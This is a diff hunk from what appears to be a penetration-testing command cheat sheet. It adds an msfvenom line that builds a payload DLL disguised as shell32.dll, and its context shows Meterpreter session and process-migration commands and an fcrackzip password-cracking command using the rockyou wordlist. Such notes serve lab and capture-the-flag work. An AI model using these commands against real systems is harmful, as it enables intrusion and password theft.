@@ -235,6 +235,9 @@ sessions -i 1
 ps
 migrate 1828
 
+MSFVENOM
+msfvenom -f dll -p windows/exec CMD="C:\Windows\system32\calc.exe" -o shell32.dll
+
 FCRACKZIP
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
 
